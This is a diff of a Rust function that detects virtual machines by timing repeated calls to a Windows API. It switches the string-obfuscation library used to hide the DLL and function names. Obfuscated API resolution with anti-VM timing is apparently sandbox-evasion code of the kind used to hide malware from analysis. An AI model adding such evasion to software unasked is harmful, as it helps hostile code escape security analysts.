@@ -1,18 +1,18 @@
 #[allow(dead_code)]
+use obfstr::obfbytes;
 pub fn is_running_in_vm_api_flooding(iterations: u32, threshold_ms: u128) -> bool {
     use std::time::Instant;
     use std::mem::transmute;
-    use rustcrypt_ct_macros::{obf_lit_bytes};
     use crate::utils::{load_library, get_proc_address};
 
     unsafe {
-        let kernel32 = match load_library(&obf_lit_bytes!(b"kernel32.dll\0")) {
+        let kernel32 = match load_library(&obfbytes!(b"kernel32.dll\0")) {
             Ok(lib) => lib,
             Err(_) => return false,
         };
 
         // Resolve GetSystemTimeAsFileTime to repeatedly call and measure
-        let p_time = match get_proc_address(kernel32, &obf_lit_bytes!(b"GetSystemTimeAsFileTime\0")) {
+        let p_time = match get_proc_address(kernel32, &obfbytes!(b"GetSystemTimeAsFileTime\0")) {
             Ok(f) => f,
             Err(_) => return false,
         };
